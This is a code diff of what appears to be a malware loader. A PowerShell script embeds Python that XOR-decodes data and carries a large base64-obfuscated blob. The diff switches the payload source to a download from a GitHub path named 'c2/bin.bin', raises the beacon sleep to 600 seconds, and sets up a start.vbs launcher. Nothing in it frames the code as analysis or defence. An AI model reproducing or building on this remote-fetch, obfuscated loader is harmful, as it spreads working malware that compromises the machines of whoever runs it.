@@ -37,10 +37,10 @@ def start():
             data[i] ^= key[i % len(key)]
         return bytes(data)
 
-    #with urlopen("https://github.com/gaca9302/usb/raw/refs/heads/main/c2/bin.bin") as response:
-    #    buf = response.read()
-    with open(r'C:\Tools\Python312\bin.bin', 'rb') as f:
-        buf = f.read()
+    with urlopen("https://github.com/gaca9302/usb/raw/refs/heads/main/c2/bin.bin") as response:
+        buf = response.read()
+    #with open(r'C:\Tools\Python312\bin.bin', 'rb') as f:
+    #    buf = f.read()
 
     thread_func = 'egUWFVc7GhZUU1c2FB0QAwYdChleQyAAARIaCgYBQxsJekFTU1ciNylucXw9LDonV1JSVEkDA0BReVNXT1I0cHV2LyQrNjQ6JiFuYHYxJSQhPjs3RAwSAwhVQ3lXT1JEWldBHgQfQEVPT0RSRkoABABdAAYcAF1eHRsEAR0SA0FWOxITUEEYFgUBFwgCAB03BAcwAh0AAV9GYwIOEBYEHFwWVEFHCREWU0pPBQ1fRkoABABdPy48IH13OVBBU1McCgAKVF4AQk8lGgUbBwVdc18cDhA2D0ETFlZGSgAEAFNKTykTWFxHCREWAFknMyp1fnZcQQQaGRsLFFRBHTwxJTw+K15EUkZKAAQAXRQwAQ1LV2wETVMEHgEGHUFXQF4lJDwlK15ERltdBBgDFgRBNjN+YHcta1NTV08ZAUNcVhxSQV0hBgAQRFNfMQ0fHBQqCkpDV0AEGAMWV1JSE1hcRwkRFgBZIyIyfnt3ekFTU1cEFxZfV19DU10kBQYGAWFAXBMEAAA6Ch8LQ0sdERMUBw4fFxcRDxMrFhodAxYCAUIcezEvNz8yQ1ITWFxHCREWAFkjIjJ+e3dcQQQaGRsLFFRBHTwxMCU4JjZIEVFHCREWAFkMLRdYSFYvFV9TFBsLFFRBHSAuOj0jKiBMUkZKAAQAXRQwAQ1LV2wESC55V09SRFpXQR4EH0BFQSUWWEZWIBMcEBIcASlUX1wCGF0BEhwGHUFXE01BBBoZGwsUVEEdMi48P31PUkQRUUYCExYdAzACFl5RVgMSU05XBBcWX1dfQ1NdNBIbMRFDQFYeFSMBGAwXF0IaGnpBU1NXHBE7XFdeHxMKU0pPGQFDXFYcUkFdIQYAEERTXzENHxwUKgpMUkdBAgQdBygfAAtSV0ADTVM9GAEXSBFeVh5JEQYRRl5EfHd+LyI8PjomJkgRYnI3JCw2LyoxMWV3bCIkMjcgPTswdBs5UEFTUxUWBgFCbUQCCAcHEgFSWRFRRwkRFgBZDC0XWEhWLxVbQ15lUkQRElgVEx0WG1xASmZAWgQEIwEYDBcXQn9WHQ4BCl8MBxZDV10EPgMBGAwXF0IeEwMCLB4SAh0WSB5QBBgDFgRBETtSWlICPgNbFRoUTR1eVh5JEQYRRl4HRUtDFRJdEQ4dFwIZUEoEBAAsAB0bEEVXXVlIeVNXT1IXWVdfHD4VBhkMUlkRUUcJERYAWSw0MX9xZykxNls5ABwBGBpAEz4eFhoAAB0YOBNQQVMAHwoeCG5URh4CW1p9T1JEEUBWBBQBHVdeeA=='
 
@@ -69,7 +69,7 @@ if __name__ == "__main__":
                         flag = False
             except Exception as e:
                 print(e)            
-            time.sleep(60)
+            time.sleep(600)
 "@
 
 # Создать файл start.vbs в кодировке UTF8
